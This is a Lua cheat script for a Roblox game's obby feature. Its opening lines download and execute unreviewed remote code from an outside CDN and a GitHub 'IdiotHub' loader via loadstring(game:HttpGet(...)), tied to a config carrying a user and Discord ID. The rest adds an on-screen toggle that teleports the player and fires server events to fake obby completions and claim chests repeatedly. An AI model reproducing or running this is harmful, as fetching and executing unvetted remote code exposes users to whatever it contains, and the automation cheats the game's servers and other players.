-- === MAIN SCRIPT ===
_G.Config = {
    UserID = "3087df52-2f5c-4e6f-a407-10fa72d16932",
    discord_id = "1135837863603351573",
    Note = "Pc"
}

local s
for i = 1, 5 do
    s = pcall(function()
        loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/bgsi"))()
    end)
    if s then break end
    wait(5)
end
--Script loader for every supported game

loadstring(game:HttpGet("https://raw.githubusercontent.com/IdiotHub/Scripts/main/Loader"))()
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
local Toggle = Instance.new("TextButton", ScreenGui)
Toggle.Size = UDim2.new(0, 180, 0, 50)
Toggle.Position = UDim2.new(0.5, -90, 0.9, -25)
Toggle.TextScaled = true
Toggle.Font = Enum.Font.GothamBold
Toggle.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
Toggle.Text = "AUTO OBBY: OFF"
ScreenGui.ResetOnSpawn = false

local ENABLED = false
local DIFFICULTIES_TO_CYCLE = { "Easy", "Medium", "Hard" }
local TELEPORT_DELAY = 2.5

local LocalData = require(ReplicatedStorage.Client.Framework.Services.LocalData)
local RemoteEvent = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
local ObbysFolder = Workspace.Obbys
local ObbyTeleports = Workspace.Worlds["Seven Seas"].Areas["Classic Island"].Obbys

local function teleportTo(target)
    local character = LocalPlayer.Character
    if not character or not target then return end
    local targetCFrame
    if typeof(target) == "CFrame" then
        targetCFrame = target
    elseif target:IsA("BasePart") then
        targetCFrame = target.CFrame
    elseif target:IsA("Model") then
        targetCFrame = target:GetPivot()
    end
    if targetCFrame then
        character:PivotTo(targetCFrame * CFrame.new(0, 3, 0))
    end
end

local function runObbyCycle(difficulty)
    local teleportPart = ObbyTeleports:FindFirstChild(difficulty)
        and ObbyTeleports[difficulty]:FindFirstChild("Portal")
        and ObbyTeleports[difficulty].Portal:FindFirstChild("Part")
    local completePart = ObbysFolder:FindFirstChild(difficulty)
        and ObbysFolder[difficulty]:FindFirstChild("Complete")
    if not teleportPart or not completePart then return end
    teleportTo(teleportPart)
    task.wait(0.5)
    RemoteEvent:FireServer("StartObby", difficulty)
    task.wait(TELEPORT_DELAY)
    teleportTo(completePart)
    task.wait(0.5)
    RemoteEvent:FireServer("CompleteObby")
    task.wait(0.5)
    local startTime = os.clock()
    while os.clock() - startTime < 30 and ENABLED do
        RemoteEvent:FireServer("ClaimObbyChest")
        task.wait(0.7)
    end
end

task.spawn(function()
    while task.wait(1) do
        if not ENABLED then continue end
        local character = LocalPlayer.Character
        local playerData = LocalData:Get()
        if not character or not character.PrimaryPart or not playerData or not playerData.ObbyCooldowns then continue end
        local initialPosition = character.PrimaryPart.CFrame
        local completedAnObbyInCycle = false
        for _, difficulty in ipairs(DIFFICULTIES_TO_CYCLE) do 
            if not ENABLED then break end
            local cooldownEndTime = playerData.ObbyCooldowns[difficulty] or 0
            if os.time() >= cooldownEndTime then
                runObbyCycle(difficulty)
                completedAnObbyInCycle = true
                task.wait(3)
                playerData = LocalData:Get()
                if not playerData or not playerData.ObbyCooldowns then break end
            end
        end
        if completedAnObbyInCycle then
            teleportTo(initialPosition)
        end
        playerData = LocalData:Get()
        if not playerData or not playerData.ObbyCooldowns then continue end
        local nextAvailableTime = math.huge
        for _, difficulty in ipairs(DIFFICULTIES_TO_CYCLE) do
            local cooldownEndTime = playerData.ObbyCooldowns[difficulty] or 0
            if cooldownEndTime > os.time() and cooldownEndTime < nextAvailableTime then
                nextAvailableTime = cooldownEndTime
            end
        end
        if nextAvailableTime ~= math.huge then
            local timeToWait = nextAvailableTime - os.time()
            if timeToWait > 0 then
                task.wait(timeToWait)
            end
        end
    end
end)

Toggle.MouseButton1Click:Connect(function()
    ENABLED = not ENABLED
    if ENABLED then
        Toggle.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        Toggle.Text = "AUTO OBBY: ON"
    else
        Toggle.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        Toggle.Text = "AUTO OBBY: OFF"
    end
end)
